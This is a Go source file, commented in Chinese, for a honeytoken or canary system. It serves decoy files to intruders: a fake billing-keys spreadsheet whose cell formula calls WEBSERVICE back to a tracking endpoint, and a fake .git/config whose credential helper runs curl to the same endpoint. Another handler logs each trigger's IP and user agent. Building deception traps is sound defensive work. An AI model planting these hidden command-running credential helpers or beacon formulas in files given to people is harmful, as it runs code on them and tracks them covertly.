// Package phantom 高级金丝雀陷阱
// 实现反向渗透：Excel 宏注入、Git 凭证陷阱
package phantom

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"fmt"
	"net/http"
	"sync"
	"time"
)

// AdvancedCanary 高级金丝雀
type AdvancedCanary struct {
	mu sync.RWMutex

	// 回调端点
	callbackEndpoint string

	// 触发记录
	triggers []CanaryTrigger

	// 回调
	onTrigger func(trigger *CanaryTrigger)
}

// CanaryTrigger 金丝雀触发记录
type CanaryTrigger struct {
	ID         string    `json:"id"`
	Type       string    `json:"type"` // excel, git, dns
	TriggerIP  string    `json:"triggerIP"`
	TriggerAt  time.Time `json:"triggerAt"`
	UserAgent  string    `json:"userAgent"`
	ExtraData  string    `json:"extraData"`
}

// NewAdvancedCanary 创建高级金丝雀
func NewAdvancedCanary(callbackEndpoint string) *AdvancedCanary {
	return &AdvancedCanary{
		callbackEndpoint: callbackEndpoint,
		triggers:         make([]CanaryTrigger, 0, 1000),
	}
}

// Handler 返回 HTTP 处理器
func (ac *AdvancedCanary) Handler() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("/canary/excel", ac.handleExcelDownload)
	mux.HandleFunc("/canary/git-config", ac.handleGitConfig)
	mux.HandleFunc("/canary/callback", ac.handleCallback)
	mux.HandleFunc("/canary/dns-callback", ac.handleDNSCallback)
	return mux
}

// handleExcelDownload 生成带宏的 Excel 文件
func (ac *AdvancedCanary) handleExcelDownload(w http.ResponseWriter, r *http.Request) {
	tokenID := fmt.Sprintf("excel_%d", time.Now().UnixNano())
	xlsx := ac.generateExcelWithMacro(tokenID)

	w.Header().Set("Content-Type", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
	w.Header().Set("Content-Disposition", "attachment; filename=billing_keys_backup.xlsx")
	w.Write(xlsx)
}

// handleGitConfig 生成带陷阱的 .git/config
func (ac *AdvancedCanary) handleGitConfig(w http.ResponseWriter, r *http.Request) {
	tokenID := fmt.Sprintf("git_%d", time.Now().UnixNano())
	config := ac.generateGitConfig(tokenID)

	w.Header().Set("Content-Type", "text/plain")
	w.Header().Set("Content-Disposition", "attachment; filename=config")
	w.Write([]byte(config))
}

// handleCallback 处理金丝雀回调
func (ac *AdvancedCanary) handleCallback(w http.ResponseWriter, r *http.Request) {
	tokenID := r.URL.Query().Get("t")
	tokenType := r.URL.Query().Get("type")
	if tokenType == "" {
		tokenType = "unknown"
	}

	trigger := CanaryTrigger{
		ID:        tokenID,
		Type:      tokenType,
		TriggerIP: extractIP(r.RemoteAddr),
		TriggerAt: time.Now(),
		UserAgent: r.UserAgent(),
	}

	ac.mu.Lock()
	ac.triggers = append(ac.triggers, trigger)
	callback := ac.onTrigger
	ac.mu.Unlock()

	if callback != nil {
		go callback(&trigger)
	}

	// 返回空响应
	w.WriteHeader(http.StatusNoContent)
}

// handleDNSCallback 处理 DNS 回调
func (ac *AdvancedCanary) handleDNSCallback(w http.ResponseWriter, r *http.Request) {
	subdomain := r.URL.Query().Get("sub")
	trigger := CanaryTrigger{
		ID:        subdomain,
		Type:      "dns",
		TriggerIP: extractIP(r.RemoteAddr),
		TriggerAt: time.Now(),
		ExtraData: r.URL.Query().Get("data"),
	}

	ac.mu.Lock()
	ac.triggers = append(ac.triggers, trigger)
	callback := ac.onTrigger
	ac.mu.Unlock()

	if callback != nil {
		go callback(&trigger)
	}

	w.WriteHeader(http.StatusNoContent)
}

// generateExcelWithMacro 生成带追踪宏的 Excel
func (ac *AdvancedCanary) generateExcelWithMacro(tokenID string) []byte {
	// 简化的 XLSX 结构（实际生产中应使用 excelize 库）
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	// [Content_Types].xml
	contentTypes := `<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>`
	w, _ := zw.Create("[Content_Types].xml")
	w.Write([]byte(contentTypes))

	// _rels/.rels
	rels := `<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>`
	w, _ = zw.Create("_rels/.rels")
	w.Write([]byte(rels))

	// xl/workbook.xml
	workbook := `<?xml version="1.0" encoding="UTF-8"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheets><sheet name="Keys" sheetId="1" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></sheets>
</workbook>`
	w, _ = zw.Create("xl/workbook.xml")
	w.Write([]byte(workbook))

	// xl/_rels/workbook.xml.rels
	wbRels := `<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>`
	w, _ = zw.Create("xl/_rels/workbook.xml.rels")
	w.Write([]byte(wbRels))

	// xl/worksheets/sheet1.xml - 包含 WEBSERVICE 函数
	callbackURL := fmt.Sprintf("%s/canary/callback?t=%s&type=excel", ac.callbackEndpoint, tokenID)
	sheet := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData>
<row r="1"><c r="A1" t="s"><v>CONFIDENTIAL - Billing System Keys</v></c></row>
<row r="2"><c r="A2" t="str"><f>WEBSERVICE("%s")</f><v></v></c></row>
<row r="3"><c r="A3" t="s"><v>Key ID: %s</v></c></row>
</sheetData>
</worksheet>`, callbackURL, base64.StdEncoding.EncodeToString([]byte(tokenID))[:16])
	w, _ = zw.Create("xl/worksheets/sheet1.xml")
	w.Write([]byte(sheet))

	zw.Close()
	return buf.Bytes()
}

// generateGitConfig 生成带陷阱的 Git 配置
func (ac *AdvancedCanary) generateGitConfig(tokenID string) string {
	// 使用 credential helper 触发 DNS 请求
	return fmt.Sprintf(`[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true

[remote "origin"]
	url = https://internal-git.mirage-system.local/billing/keys.git
	fetch = +refs/heads/*:refs/remotes/origin/*

[credential]
	helper = "!f() { echo username=admin; echo password=; curl -s '%s/canary/callback?t=%s&type=git' >/dev/null 2>&1; }; f"

[user]
	name = System Admin
	email = admin@mirage-system.local
`, ac.callbackEndpoint, tokenID)
}

// GetTriggers 获取所有触发记录
func (ac *AdvancedCanary) GetTriggers() []CanaryTrigger {
	ac.mu.RLock()
	defer ac.mu.RUnlock()
	result := make([]CanaryTrigger, len(ac.triggers))
	copy(result, ac.triggers)
	return result
}

// GetTriggersByType 按类型获取触发记录
func (ac *AdvancedCanary) GetTriggersByType(triggerType string) []CanaryTrigger {
	ac.mu.RLock()
	defer ac.mu.RUnlock()
	var result []CanaryTrigger
	for _, t := range ac.triggers {
		if t.Type == triggerType {
			result = append(result, t)
		}
	}
	return result
}

// OnTrigger 设置触发回调
func (ac *AdvancedCanary) OnTrigger(fn func(trigger *CanaryTrigger)) {
	ac.mu.Lock()
	defer ac.mu.Unlock()
	ac.onTrigger = fn
}

// GenerateDNSCanaryDomain 生成 DNS 金丝雀域名
func (ac *AdvancedCanary) GenerateDNSCanaryDomain(tokenID string) string {
	return fmt.Sprintf("%s.canary.mirage-trap.local", tokenID)
}
